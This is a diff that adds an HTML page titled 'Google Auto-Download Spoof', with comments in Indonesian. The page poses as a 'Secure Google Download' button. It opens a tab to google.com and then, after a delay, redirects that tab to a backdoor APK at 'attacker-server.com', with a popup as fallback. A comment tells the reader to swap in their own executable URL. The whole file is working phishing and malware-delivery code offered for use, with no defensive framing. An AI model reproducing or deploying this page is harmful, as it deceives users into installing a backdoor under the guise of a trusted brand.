@@ -1,0 +1,50 @@
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Google Auto-Download Spoof</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+        }
+        .download-btn {
+            background-color: #4285f4;
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <h2>Secure Google Download</h2>
+    <button class="download-btn" onclick="initiateDownload()">Download Secure File</button>
+
+    <script>
+        function initiateDownload() {
+            // Buka tab baru ke Google
+            const newWindow = window.open('https://google.com', 'downloadFrame');
+            
+            // Tunggu 3 detik lalu trigger download berbahaya
+            setTimeout(() => {
+                // Ganti dengan URL file executable Anda
+                const maliciousFile = 'https://attacker-server.com/backdoor.apk';
+                
+                // Trigger download di window yang sama
+                newWindow.location.href = maliciousFile;
+                
+                // Fallback: Jika blocked, buka popup
+                setTimeout(() => {
+                    if (newWindow.closed || newWindow.innerHeight === 0) {
+                        window.open(maliciousFile, 'downloadFrame', 'width=500,height=300');
+                    }
+                }, 1000);
+                
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
